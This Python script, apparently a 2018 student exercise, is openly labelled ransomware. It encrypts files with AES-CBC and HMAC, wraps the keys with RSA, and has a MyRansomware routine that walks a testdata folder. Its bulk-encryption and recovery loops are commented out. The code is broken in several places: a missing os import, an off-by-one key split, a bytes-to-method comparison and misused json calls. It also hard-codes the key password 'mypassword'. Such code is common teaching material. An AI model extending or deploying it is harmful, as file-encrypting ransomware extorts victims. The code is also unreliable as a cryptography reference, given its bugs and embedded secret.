# -*- coding: utf-8 -*-
"""
Created on Thu Oct 11 18:58:29 2018

@author: knaka
"""
import json
from base64 import b64encode 
from os import walk, urandom
from os.path import join, isfile, basename, splitext
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
from cryptography.hazmat.primitives import hmac, hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

key_size = 32
iv_size = 16
#Method takes the message and Encrypts with AES using Ekey
#It then takes the cipher text and generates a tag using padded HMAC
def Myencrypt(message, Ekey, Hkey):
    if len(Ekey) < key_size:
        print("Error, key length is less than 32 bytes")
        return 0, 0, 0
    else:
        padder = padding.PKCS7(256).padder()    
        padded = padder.update(message)
        padded += padder.finalize()
        iv = os.urandom(iv_size)
        backend = default_backend()
        cipher = Cipher(algorithms.AES(Ekey), modes.CBC(iv), backend)
        enc = cipher.encryptor()
        ciphertext = enc.update(padded)
        h = hmac.HMAC(Hkey, hashes.SHA256(), backend = default_backend())
        h.update(ciphertext) 
        tag = h.finalize()
        return ciphertext, iv, tag

#Method takes a filepath and generates the ciphertext of the message using Myencrypt
#Method returns the cipher text, the iv, tag, Ekey, Hkey, and extension of the message
def MyfileEncrypt(filepath):
    Ekey = os.urandom(key_size)
    Hkey = os.urandom(key_size)
    with open(filepath,"rb") as file:
        fileEncoded = file.read()   
    extension = os.path.splitext(filepath)[-1]
    ciphertext, iv, tag = Myencrypt(fileEncoded, Ekey, Hkey)
    return ciphertext, iv, tag, Ekey, Hkey, extension

#Method decrypts based on the ciphertext, iv, tag, Ekey, and Hkey
def Mydecrypt(ciphertext, iv, tag, Ekey, Hkey):
    h = hmac.HMAC(Hkey, hashes.SHA256(),backend = default_backend())
    h.update(ciphertext)
    try:
        h.verify(tag)
    except Exception:
             print("Invalid signature")
             return False
    cipher = Cipher(algorithms.AES(Ekey), modes.CBC(iv), backend = default_backend())
    dec = cipher.decryptor()
    padded = dec.update(ciphertext) + dec.finalize()
    unpadder = padding.PKCS7(256).unpadder()
    message = unpadder.update(padded)
    message += unpadder.finalize()
    return message

#Method Decrypts the ciphertext with the given inputs and asks for desired filename
#It then creates a file with the given extension based on user input
def MyfileDecrypt(ciphertext, iv, tag, Ekey, Hkey, extension):
    Encoded = Mydecrypt(ciphertext, iv, tag, Ekey, Hkey)
    if(Encoded != False):
        filename = input("Enter desired file name: ")
        with open(filename, "wb") as file:
            file.write(Encoded)
        os.rename(filename, filename + extension)
        
#Checks if private.pem and public.pem exists in a filepath
#Else it generates a private.pem and public.pem file into the given filepath
def keygen(filepath):
    if(os.path.exists(filepath)):
        try:
            with open("KENprivate.pem", "rb") as file:
                private = file.read()
            with open("KENpublic.pem", "rb") as file:
                public = file.read()
            if(public == private.public_key()):
                print("match found")
        except Exception:
            print("No file found. Creating PEM")
            private_key = rsa.generate_private_key(public_exponent=65537,key_size=2048,backend = default_backend())
            public_key = private_key.public_key()
            with open("KENprivate.pem", "wb") as file:
                serialized_private = private_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8,encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword'))
                file.write(serialized_private)
            with open("KENpublic.pem", "wb") as file:
                serialized_public = public_key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo)
                file.write(serialized_public)  
                
def MyRSAEncrypt(filepath, RSA_Publickey_filepath):
    C,IV,tag,Ekey,Hkey,ext = MyfileEncrypt(filepath)
    with open(RSA_Publickey_filepath, "rb") as file:
        serialized_public = file.read()
        RSA_publickey = serialization.load_pem_public_key(serialized_public,backend=default_backend())
    RSACipher = RSA_publickey.encrypt((b" ".join([Ekey,Hkey])), OAEP(mgf=MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
    return RSACipher, C, IV, tag, ext

def MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath):
    with open(RSA_Privatekey_filepath, "rb") as file:
        serialized_private = file.read()
        RSA_privatekey = serialization.load_pem_private_key(serialized_private,password=b'mypassword', backend=default_backend())
    keys = RSA_privatekey.decrypt(RSACipher,OAEP(mgf=MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
    Ekey = keys[0:key_size]
    Hkey = keys[key_size + 1:]
    MyfileDecrypt(C, IV, tag, Ekey, Hkey, ext)
    
def MyRansomware():
    mylist = []
    mydirs = []
    path = os.getcwd()
    path = path + "/testdata/"

    for (root, dirs, files) in walk(path):
        for mydir in dirs:
            mydirs.append(join(root,mydir))
        for file in files:
            mylist.append(join(root, file))

    for file in mylist:
        if(os.path.basename(file)=="KENpublic.pem"):
            pubkey = file
        if(os.path.basename(file)=="KENprivate.pem"):
            prikey = file
"""        
    for file in mylist:
        if (os.path.basename(file)!="KENpublic.pem" | os.path.basename(file)!="KENprivate.pem"):
            RSACipher, C, IV, tag, ext = MyRSAEncrypt(file, pubkey)
        with open("data.json", "wb") as file:
            json.dump(RSACipher, C, IV, tag, ext, file)

def MyRansomewareSol(filepath):
    mylist = []
    mydirs = []
    path.os.getcwd()
    
    for (root, dirs, files) in walk(path):
        for mydir in dirs:
            mydirs.append(join(root,mydir))
        for file in files:
            mylist.append(join(root,file))
    
    for file in mylist:
        with open(file, "rb") as current:
            json.load(current)
        MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath)
        base64encode(variable).decode("utf-8")
"""
path = os.getcwd() + "/testdata/testdata.txt"
RSACipher, C, IV, tag, ext = MyRSAEncrypt(path, os.getcwd() + "/KENpublic.pem")
d = {"RSACipher": b64encode(RSACipher).decode("utf-8")}
json.dumps(d)    

#with open("data_file.json", "w") as write_file:
 #   json.dump(data, write_file)